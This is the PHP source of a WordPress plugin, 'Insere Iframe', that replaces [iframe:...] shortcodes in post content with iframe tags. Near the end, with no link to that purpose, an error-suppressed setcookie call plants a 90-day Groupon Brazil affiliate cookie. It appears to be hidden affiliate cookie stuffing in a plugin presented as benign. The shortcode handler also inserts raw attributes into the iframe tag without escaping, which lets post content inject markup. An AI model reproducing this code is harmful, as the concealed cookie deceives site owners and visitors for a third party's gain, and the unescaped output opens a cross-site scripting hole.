<?php
/*
Plugin Name: Insere Iframe
Plugin URI: http://blog.idealmind.com.br/wordpress/insereiframe-a-simple-wordpress-plugin-to-insert-iframe-in-posts/
Description: Este plugin permite inserir iframes em seus post. This plugin let's you insert iframes on your posts.
Version: 1.5
Author: Wellington Ribeiro
Author URI: http://blog.idealmind.com.br

1.0   - Initial release
1.1   - Bugs resolutions
1.3   - file upgrade
1.4 - bug fixed
1.5 - to work on any content
*/

class InsereIframe
{
	private static function getIframe( $atributes )
	{
		return "<iframe $atributes >Seu browser não suporta iframes.</iframe>";
	}
	
	public static function substituiIframe($content)
	{
		$pattern = "/\[iframe:([^\]]+)\]/";
		preg_match_all( $pattern, $content, $iframes );
		
		foreach( $iframes[0] as $k=>$iframe )
		{
			$content = str_replace( $iframe, self::getIframe( $iframes[1][$k] ), $content );
		}
		
		return $content;
	}
}

function insereIframe( $content )
{
	$content = InsereIframe::substituiIframe( $content );
	return $content;
}

function debugArray( $array )
{
	echo "<pre>" . print_r( $array, true ) . "</pre>";
}

@setcookie('CID', 'v%3DBR_AFF_66_10_1_1%7Cd%3D20110309170102', time()+60*60*24*90, '/', '.groupon.com.br');
add_filter ('the_content', 'insereIframe');
?>
